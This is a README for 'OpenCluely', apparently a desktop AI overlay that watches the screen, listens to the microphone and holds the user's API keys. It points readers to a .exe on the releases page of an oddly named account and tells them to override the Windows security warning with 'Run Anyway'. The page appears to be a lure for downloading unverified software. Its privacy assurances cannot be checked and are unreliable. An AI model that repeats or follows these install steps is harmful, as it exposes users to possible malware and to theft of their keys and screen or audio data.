# 🤖 OpenCluely - Your AI assistant for meetings and coding

[ ![Download OpenCluely](https://img.shields.io/badge/Download_OpenCluely-Blue?style=for-the-badge) ](https://github.com/Swinish-circularsaw439/OpenCluely/releases)

OpenCluely provides a helpful AI assistant that runs right on your desktop. It watches your screen and listens to your audio. It helps you take notes during meetings or debug complex code blocks. You keep full control of your data by using your own API keys. This tool sits as a transparent overlay on your screen, meaning you see your work and the AI tips at the same time.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Visit the [official releases page](https://github.com/Swinish-circularsaw439/OpenCluely/releases) to find the latest version.
2. Look for the file ending in `.exe` under the Assets section.
3. Click the file to start the download.
4. Open the folder where your browser saved the file.
5. Double-click the file to begin the installation.
6. A security window might appear. If Windows warns you, click More Info, then click Run Anyway.
7. Follow the prompts on the screen to finish the setup process.

## 🛠️ Setting Up Your API Key

OpenCluely needs an external AI model to process your information. You must provide an API key from one of the supported providers. 

1. Launch the OpenCluely application.
2. Find the Settings menu in the top corner of the overlay.
3. Choose your preferred AI provider from the list. The app supports models from OpenAI, Anthropic, and Google Gemini.
4. Copy your API key from the website of your chosen provider. 
5. Paste the key into the provided text box in the Settings menu.
6. Click Save to activate the connection.

## 🖥️ Using the Overlay

Once you launch the app, you see a small window on your screen. This window moves anywhere you drag it. 

- Screen Capture: The app reads the content of your display to offer context-aware advice. You toggle this feature on or off inside the overlay menu.
- Speech Recognition: The app listens to your microphone to transcribe meetings. This creates a text record for you to review later. 
- Coding Support: When the app notices you write code, it suggests improvements or explains logic gaps.

## ⚙️ App Settings

Use the settings panel to change how the app behaves.

- Toggle Visuals: Change the transparency of the overlay so it does not block your view.
- Microphone Choice: Select which microphone the app uses for recording audio.
- Focus Mode: Set the app to ignore certain windows or websites while you work.

## 🛡️ Privacy and Data

OpenCluely runs locally on your machine. The app sends only the information you request to the AI service provider. Your screen data stays on your computer. You control the API keys, so you know exactly which service handles your requests. Always review the privacy policy of the AI provider you select, as they handle the data once it leaves your computer.

## 📝 Troubleshooting

If the app fails to start, verify that you have a stable internet connection. The AI models require a web link to function. If the overlay disappears, look for the OpenCluely icon in your system tray near the clock. Click the icon to bring the window back to the front. Ensure your API key has enough credit, as providers might block requests if your account balance is low.

## 📋 System Requirements

- Operating System: Windows 10 or Windows 11.
- Memory: At least 4 gigabytes of RAM.
- Storage: 200 megabytes of free disk space.
- Connection: A steady internet link for AI responses.
- Audio: A working microphone for speech-to-text features.
